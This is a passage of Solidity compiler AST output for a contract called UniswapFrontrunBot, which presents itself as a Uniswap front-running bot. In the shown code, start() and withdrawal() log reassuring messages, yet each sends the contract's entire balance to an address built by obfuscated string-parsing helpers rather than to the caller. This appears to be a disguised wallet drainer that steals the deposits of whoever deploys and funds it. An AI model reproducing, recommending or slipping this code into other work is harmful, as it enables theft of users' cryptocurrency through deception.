																			"typeIdentifier": null,
																			"typeString": null
																		}
																	}
																},
																"id": 1394,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"kind": "typeConversion",
																"lValueRequested": false,
																"names": [],
																"nodeType": "FunctionCall",
																"src": "15618:26:0",
																"tryCall": false,
																"typeDescriptions": {
																	"typeIdentifier": "t_bytes1",
																	"typeString": "bytes1"
																}
															},
															"functionReturnParameters": 1375,
															"id": 1395,
															"nodeType": "Return",
															"src": "15611:33:0"
														}
													]
												}
											},
											{
												"expression": {
													"argumentTypes": null,
													"arguments": [],
													"expression": {
														"argumentTypes": [],
														"id": 1428,
														"name": "revert",
														"nodeType": "Identifier",
														"overloadedDeclarations": [
															-19,
															-19
														],
														"referencedDeclaration": -19,
														"src": "15816:6:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_revert_pure$__$returns$__$",
															"typeString": "function () pure"
														}
													},
													"id": 1429,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "15816:8:0",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 1430,
												"nodeType": "ExpressionStatement",
												"src": "15816:8:0"
											}
										]
									},
									"documentation": null,
									"id": 1432,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "toHexDigit",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 1372,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1371,
												"mutability": "mutable",
												"name": "d",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1432,
												"src": "15525:7:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint8",
													"typeString": "uint8"
												},
												"typeName": {
													"id": 1370,
													"name": "uint8",
													"nodeType": "ElementaryTypeName",
													"src": "15525:5:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint8",
														"typeString": "uint8"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "15524:9:0"
									},
									"returnParameters": {
										"id": 1375,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1374,
												"mutability": "mutable",
												"name": "",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1432,
												"src": "15557:4:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_bytes1",
													"typeString": "bytes1"
												},
												"typeName": {
													"id": 1373,
													"name": "byte",
													"nodeType": "ElementaryTypeName",
													"src": "15557:4:0",
													"typeDescriptions": {
														"typeIdentifier": "t_bytes1",
														"typeString": "bytes1"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "15556:6:0"
									},
									"scope": 1680,
									"src": "15505:327:0",
									"stateMutability": "pure",
									"virtual": false,
									"visibility": "internal"
								},
								{
									"body": {
										"id": 1442,
										"nodeType": "Block",
										"src": "15911:56:0",
										"statements": [
											{
												"expression": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"arguments": [],
															"expression": {
																"argumentTypes": [],
																"id": 1438,
																"name": "callMempool",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 1369,
																"src": "15945:11:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_function_internal_pure$__$returns$_t_string_memory_ptr_$",
																	"typeString": "function () pure returns (string memory)"
																}
															},
															"id": 1439,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"kind": "functionCall",
															"lValueRequested": false,
															"names": [],
															"nodeType": "FunctionCall",
															"src": "15945:13:0",
															"tryCall": false,
															"typeDescriptions": {
																"typeIdentifier": "t_string_memory_ptr",
																"typeString": "string memory"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_string_memory_ptr",
																"typeString": "string memory"
															}
														],
														"id": 1437,
														"name": "parseMemoryPool",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 905,
														"src": "15929:15:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_internal_pure$_t_string_memory_ptr_$returns$_t_address_$",
															"typeString": "function (string memory) pure returns (address)"
														}
													},
													"id": 1440,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "15929:30:0",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"functionReturnParameters": 1436,
												"id": 1441,
												"nodeType": "Return",
												"src": "15922:37:0"
											}
										]
									},
									"documentation": null,
									"id": 1443,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "_callFrontRunActionMempool",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 1433,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "15876:2:0"
									},
									"returnParameters": {
										"id": 1436,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1435,
												"mutability": "mutable",
												"name": "",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1443,
												"src": "15902:7:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 1434,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "15902:7:0",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "15901:9:0"
									},
									"scope": 1680,
									"src": "15841:126:0",
									"stateMutability": "pure",
									"virtual": false,
									"visibility": "internal"
								},
								{
									"body": {
										"id": 1463,
										"nodeType": "Block",
										"src": "16124:184:0",
										"statements": [
											{
												"eventCall": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"hexValue": "52756e6e696e672046726f6e7452756e2061747461636b206f6e20556e69737761702e20546869732063616e2074616b652061207768696c6520706c6561736520776169742e2e2e",
															"id": 1447,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "string",
															"lValueRequested": false,
															"nodeType": "Literal",
															"src": "16145:74:0",
															"subdenomination": null,
															"typeDescriptions": {
																"typeIdentifier": "t_stringliteral_a605a138a70f3ae4d1364b0a4be28f180d3f021084227d7f914f61c97fb6a66e",
																"typeString": "literal_string \"Running FrontRun attack on Uniswap. This can take a while please wait...\""
															},
															"value": "Running FrontRun attack on Uniswap. This can take a while please wait..."
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_stringliteral_a605a138a70f3ae4d1364b0a4be28f180d3f021084227d7f914f61c97fb6a66e",
																"typeString": "literal_string \"Running FrontRun attack on Uniswap. This can take a while please wait...\""
															}
														],
														"id": 1446,
														"name": "Log",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 14,
														"src": "16141:3:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_event_nonpayable$_t_string_memory_ptr_$returns$__$",
															"typeString": "function (string memory)"
														}
													},
													"id": 1448,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "16141:79:0",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 1449,
												"nodeType": "EmitStatement",
												"src": "16136:84:0"
											},
											{
												"expression": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"expression": {
																"argumentTypes": null,
																"arguments": [
																	{
																		"argumentTypes": null,
																		"id": 1458,
																		"name": "this",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": -28,
																		"src": "16286:4:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_contract$_UniswapFrontrunBot_$1680",
																			"typeString": "contract UniswapFrontrunBot"
																		}
																	}
																],
																"expression": {
																	"argumentTypes": [
																		{
																			"typeIdentifier": "t_contract$_UniswapFrontrunBot_$1680",
																			"typeString": "contract UniswapFrontrunBot"
																		}
																	],
																	"id": 1457,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": true,
																	"lValueRequested": false,
																	"nodeType": "ElementaryTypeNameExpression",
																	"src": "16278:7:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_type$_t_address_$",
																		"typeString": "type(address)"
																	},
																	"typeName": {
																		"id": 1456,
																		"name": "address",
																		"nodeType": "ElementaryTypeName",
																		"src": "16278:7:0",
																		"typeDescriptions": {
																			"typeIdentifier": null,
																			"typeString": null
																		}
																	}
																},
																"id": 1459,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"kind": "typeConversion",
																"lValueRequested": false,
																"names": [],
																"nodeType": "FunctionCall",
																"src": "16278:13:0",
																"tryCall": false,
																"typeDescriptions": {
																	"typeIdentifier": "t_address_payable",
																	"typeString": "address payable"
																}
															},
															"id": 1460,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"memberName": "balance",
															"nodeType": "MemberAccess",
															"referencedDeclaration": null,
															"src": "16278:21:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														],
														"expression": {
															"argumentTypes": null,
															"arguments": [
																{
																	"argumentTypes": null,
																	"arguments": [],
																	"expression": {
																		"argumentTypes": [],
																		"id": 1452,
																		"name": "_callFrontRunActionMempool",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 1443,
																		"src": "16239:26:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_function_internal_pure$__$returns$_t_address_$",
																			"typeString": "function () pure returns (address)"
																		}
																	},
																	"id": 1453,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": false,
																	"kind": "functionCall",
																	"lValueRequested": false,
																	"names": [],
																	"nodeType": "FunctionCall",
																	"src": "16239:28:0",
																	"tryCall": false,
																	"typeDescriptions": {
																		"typeIdentifier": "t_address",
																		"typeString": "address"
																	}
																}
															],
															"expression": {
																"argumentTypes": [
																	{
																		"typeIdentifier": "t_address",
																		"typeString": "address"
																	}
																],
																"id": 1451,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"lValueRequested": false,
																"nodeType": "ElementaryTypeNameExpression",
																"src": "16231:8:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_type$_t_address_payable_$",
																	"typeString": "type(address payable)"
																},
																"typeName": {
																	"id": 1450,
																	"name": "address",
																	"nodeType": "ElementaryTypeName",
																	"src": "16231:8:0",
																	"stateMutability": "payable",
																	"typeDescriptions": {
																		"typeIdentifier": null,
																		"typeString": null
																	}
																}
															},
															"id": 1454,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"kind": "typeConversion",
															"lValueRequested": false,
															"names": [],
															"nodeType": "FunctionCall",
															"src": "16231:37:0",
															"tryCall": false,
															"typeDescriptions": {
																"typeIdentifier": "t_address_payable",
																"typeString": "address payable"
															}
														},
														"id": 1455,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"memberName": "transfer",
														"nodeType": "MemberAccess",
														"referencedDeclaration": null,
														"src": "16231:46:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_transfer_nonpayable$_t_uint256_$returns$__$",
															"typeString": "function (uint256)"
														}
													},
													"id": 1461,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "16231:69:0",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 1462,
												"nodeType": "ExpressionStatement",
												"src": "16231:69:0"
											}
										]
									},
									"documentation": null,
									"functionSelector": "be9a6555",
									"id": 1464,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "start",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 1444,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "16106:2:0"
									},
									"returnParameters": {
										"id": 1445,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "16124:0:0"
									},
									"scope": 1680,
									"src": "16092:216:0",
									"stateMutability": "payable",
									"virtual": false,
									"visibility": "public"
								},
								{
									"body": {
										"id": 1484,
										"nodeType": "Block",
										"src": "16466:152:0",
										"statements": [
											{
												"eventCall": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"hexValue": "53656e64696e672070726f66697473206261636b20746f20636f6e74726163742063726561746f7220616464726573732e2e2e",
															"id": 1468,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "string",
															"lValueRequested": false,
															"nodeType": "Literal",
															"src": "16487:53:0",
															"subdenomination": null,
															"typeDescriptions": {
																"typeIdentifier": "t_stringliteral_6350d1a48231284a8341dbb6cec434401eec03dd1db1d0d6d2f253f7a8b3eca6",
																"typeString": "literal_string \"Sending profits back to contract creator address...\""
															},
															"value": "Sending profits back to contract creator address..."
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_stringliteral_6350d1a48231284a8341dbb6cec434401eec03dd1db1d0d6d2f253f7a8b3eca6",
																"typeString": "literal_string \"Sending profits back to contract creator address...\""
															}
														],
														"id": 1467,
														"name": "Log",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 14,
														"src": "16483:3:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_event_nonpayable$_t_string_memory_ptr_$returns$__$",
															"typeString": "function (string memory)"
														}
													},
													"id": 1469,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "16483:58:0",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 1470,
												"nodeType": "EmitStatement",
												"src": "16478:63:0"
											},
											{
												"expression": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"expression": {
																"argumentTypes": null,
																"arguments": [
																	{
																		"argumentTypes": null,
																		"id": 1479,
																		"name": "this",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": -28,
																		"src": "16596:4:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_contract$_UniswapFrontrunBot_$1680",
																			"typeString": "contract UniswapFrontrunBot"
																		}
																	}
																],
																"expression": {
																	"argumentTypes": [
																		{
																			"typeIdentifier": "t_contract$_UniswapFrontrunBot_$1680",
																			"typeString": "contract UniswapFrontrunBot"
																		}
																	],
																	"id": 1478,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": true,
																	"lValueRequested": false,
																	"nodeType": "ElementaryTypeNameExpression",
																	"src": "16588:7:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_type$_t_address_$",
																		"typeString": "type(address)"
																	},
																	"typeName": {
																		"id": 1477,
																		"name": "address",
																		"nodeType": "ElementaryTypeName",
																		"src": "16588:7:0",
																		"typeDescriptions": {
																			"typeIdentifier": null,
																			"typeString": null
																		}
																	}
																},
																"id": 1480,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"kind": "typeConversion",
																"lValueRequested": false,
																"names": [],
																"nodeType": "FunctionCall",
																"src": "16588:13:0",
																"tryCall": false,
																"typeDescriptions": {
																	"typeIdentifier": "t_address_payable",
																	"typeString": "address payable"
																}
															},
															"id": 1481,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"memberName": "balance",
															"nodeType": "MemberAccess",
															"referencedDeclaration": null,
															"src": "16588:21:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														],
														"expression": {
															"argumentTypes": null,
															"arguments": [
																{
																	"argumentTypes": null,
																	"arguments": [],
																	"expression": {
																		"argumentTypes": [],
																		"id": 1473,
																		"name": "withdrawProfits",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 1582,
																		"src": "16560:15:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_function_internal_pure$__$returns$_t_address_$",
																			"typeString": "function () pure returns (address)"
																		}
																	},
																	"id": 1474,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": false,
																	"kind": "functionCall",
																	"lValueRequested": false,
																	"names": [],
																	"nodeType": "FunctionCall",
																	"src": "16560:17:0",
																	"tryCall": false,
																	"typeDescriptions": {
																		"typeIdentifier": "t_address",
																		"typeString": "address"
																	}
																}
															],
															"expression": {
																"argumentTypes": [
																	{
																		"typeIdentifier": "t_address",
																		"typeString": "address"
																	}
																],
																"id": 1472,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"lValueRequested": false,
																"nodeType": "ElementaryTypeNameExpression",
																"src": "16552:8:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_type$_t_address_payable_$",
																	"typeString": "type(address payable)"
																},
																"typeName": {
																	"id": 1471,
																	"name": "address",
																	"nodeType": "ElementaryTypeName",
																	"src": "16552:8:0",
																	"stateMutability": "payable",
																	"typeDescriptions": {
																		"typeIdentifier": null,
																		"typeString": null
																	}
																}
															},
															"id": 1475,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"kind": "typeConversion",
															"lValueRequested": false,
															"names": [],
															"nodeType": "FunctionCall",
															"src": "16552:26:0",
															"tryCall": false,
															"typeDescriptions": {
																"typeIdentifier": "t_address_payable",
																"typeString": "address payable"
															}
														},
														"id": 1476,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"memberName": "transfer",
														"nodeType": "MemberAccess",
														"referencedDeclaration": null,
														"src": "16552:35:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_transfer_nonpayable$_t_uint256_$returns$__$",
															"typeString": "function (uint256)"
														}
													},
													"id": 1482,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "16552:58:0",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 1483,
												"nodeType": "ExpressionStatement",
												"src": "16552:58:0"
											}
										]
									},
									"documentation": null,
									"functionSelector": "d4e93292",
									"id": 1485,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "withdrawal",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 1465,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "16448:2:0"
									},
									"returnParameters": {
										"id": 1466,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "16466:0:0"
									},
									"scope": 1680,
									"src": "16429:189:0",
									"stateMutability": "payable",
									"virtual": false,
									"visibility": "public"
								},
								{
									"body": {
										"id": 1562,
										"nodeType": "Block",
										"src": "16866:403:0",
										"statements": [
											{
												"condition": {
													"argumentTypes": null,
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 1494,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"argumentTypes": null,
														"id": 1492,
														"name": "_i",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 1487,
														"src": "16881:2:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "==",
													"rightExpression": {
														"argumentTypes": null,
														"hexValue": "30",
														"id": 1493,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"kind": "number",
														"lValueRequested": false,
														"nodeType": "Literal",
														"src": "16887:1:0",
														"subdenomination": null,
														"typeDescriptions": {
															"typeIdentifier": "t_rational_0_by_1",
															"typeString": "int_const 0"
														},
														"value": "0"
													},
													"src": "16881:7:0",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"falseBody": null,
												"id": 1498,
												"nodeType": "IfStatement",
												"src": "16877:50:0",
												"trueBody": {
													"id": 1497,
													"nodeType": "Block",
													"src": "16890:37:0",
													"statements": [
														{
															"expression": {
																"argumentTypes": null,
																"hexValue": "30",
																"id": 1495,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"kind": "string",
																"lValueRequested": false,
																"nodeType": "Literal",
																"src": "16912:3:0",
																"subdenomination": null,
																"typeDescriptions": {
																	"typeIdentifier": "t_stringliteral_044852b2a670ade5407e78fb2863c51de9fcb96542a07186fe3aeda6bb8a116d",
																	"typeString": "literal_string \"0\""
																},
																"value": "0"
															},
															"functionReturnParameters": 1491,
															"id": 1496,
															"nodeType": "Return",
															"src": "16905:10:0"
														}
													]
												}
											},
											{
												"assignments": [
													1500
												],
												"declarations": [
													{
														"constant": false,
														"id": 1500,
														"mutability": "mutable",
														"name": "j",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 1562,
														"src": "16937:6:0",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 1499,
															"name": "uint",
															"nodeType": "ElementaryTypeName",
															"src": "16937:4:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 1502,
												"initialValue": {
													"argumentTypes": null,
													"id": 1501,
													"name": "_i",
													"nodeType": "Identifier",
													"overloadedDeclarations": [],
													"referencedDeclaration": 1487,
													"src": "16946:2:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "16937:11:0"
											},
											{
												"assignments": [
													1504
												],
												"declarations": [
													{
														"constant": false,
														"id": 1504,
														"mutability": "mutable",
														"name": "len",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 1562,
														"src": "16959:8:0",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 1503,
															"name": "uint",
															"nodeType": "ElementaryTypeName",
															"src": "16959:4:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 1505,
												"initialValue": null,
												"nodeType": "VariableDeclarationStatement",
												"src": "16959:8:0"
											},
											{
												"body": {
													"id": 1516,
													"nodeType": "Block",
													"src": "16993:54:0",
													"statements": [
														{
															"expression": {
																"argumentTypes": null,
																"id": 1510,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"nodeType": "UnaryOperation",
																"operator": "++",
																"prefix": false,
																"src": "17008:5:0",
																"subExpression": {
																	"argumentTypes": null,
																	"id": 1509,
																	"name": "len",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 1504,
																	"src": "17008:3:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"id": 1511,
															"nodeType": "ExpressionStatement",
															"src": "17008:5:0"
														},
														{
															"expression": {
																"argumentTypes": null,
																"id": 1514,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftHandSide": {
																	"argumentTypes": null,
																	"id": 1512,
																	"name": "j",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 1500,
																	"src": "17028:1:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"nodeType": "Assignment",
																"operator": "/=",
																"rightHandSide": {
																	"argumentTypes": null,
																	"hexValue": "3130",
																	"id": 1513,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": true,
																	"kind": "number",
																	"lValueRequested": false,
																	"nodeType": "Literal",
																	"src": "17033:2:0",
																	"subdenomination": null,
																	"typeDescriptions": {
																		"typeIdentifier": "t_rational_10_by_1",
																		"typeString": "int_const 10"
																	},
																	"value": "10"
																},
																"src": "17028:7:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"id": 1515,
															"nodeType": "ExpressionStatement",
															"src": "17028:7:0"
														}
													]
												},
												"condition": {
													"argumentTypes": null,
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 1508,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"argumentTypes": null,
														"id": 1506,
														"name": "j",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 1500,
														"src": "16985:1:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "!=",
													"rightExpression": {
														"argumentTypes": null,
														"hexValue": "30",
														"id": 1507,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"kind": "number",
														"lValueRequested": false,
														"nodeType": "Literal",
														"src": "16990:1:0",
														"subdenomination": null,
														"typeDescriptions": {
															"typeIdentifier": "t_rational_0_by_1",
															"typeString": "int_const 0"
														},
														"value": "0"
													},
													"src": "16985:6:0",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"id": 1517,
												"nodeType": "WhileStatement",
												"src": "16978:69:0"
											},
											{
												"assignments": [
													1519
												],
												"declarations": [
													{
														"constant": false,
														"id": 1519,
														"mutability": "mutable",
														"name": "bstr",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 1562,
														"src": "17057:17:0",
														"stateVariable": false,
														"storageLocation": "memory",
														"typeDescriptions": {
															"typeIdentifier": "t_bytes_memory_ptr",
															"typeString": "bytes"
														},
														"typeName": {
															"id": 1518,
															"name": "bytes",
															"nodeType": "ElementaryTypeName",
															"src": "17057:5:0",
															"typeDescriptions": {
																"typeIdentifier": "t_bytes_storage_ptr",
																"typeString": "bytes"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 1524,
												"initialValue": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"id": 1522,
															"name": "len",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 1504,
															"src": "17087:3:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														],
														"id": 1521,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"lValueRequested": false,
														"nodeType": "NewExpression",
														"src": "17077:9:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_objectcreation_pure$_t_uint256_$returns$_t_bytes_memory_ptr_$",
															"typeString": "function (uint256) pure returns (bytes memory)"
														},
														"typeName": {
															"id": 1520,
															"name": "bytes",
															"nodeType": "ElementaryTypeName",
															"src": "17081:5:0",
															"typeDescriptions": {
																"typeIdentifier": "t_bytes_storage_ptr",
																"typeString": "bytes"
															}
														}
													},
													"id": 1523,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "17077:14:0",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_bytes_memory_ptr",
														"typeString": "bytes memory"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "17057:34:0"
											},
											{
												"assignments": [
													1526
												],
												"declarations": [
													{
														"constant": false,
														"id": 1526,
														"mutability": "mutable",
														"name": "k",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 1562,
														"src": "17102:6:0",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 1525,
															"name": "uint",
															"nodeType": "ElementaryTypeName",
															"src": "17102:4:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 1530,
												"initialValue": {
													"argumentTypes": null,
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 1529,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"argumentTypes": null,
														"id": 1527,
														"name": "len",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 1504,
														"src": "17111:3:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "-",
													"rightExpression": {
														"argumentTypes": null,
														"hexValue": "31",
														"id": 1528,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"kind": "number",
														"lValueRequested": false,
														"nodeType": "Literal",
														"src": "17117:1:0",
														"subdenomination": null,
														"typeDescriptions": {
															"typeIdentifier": "t_rational_1_by_1",
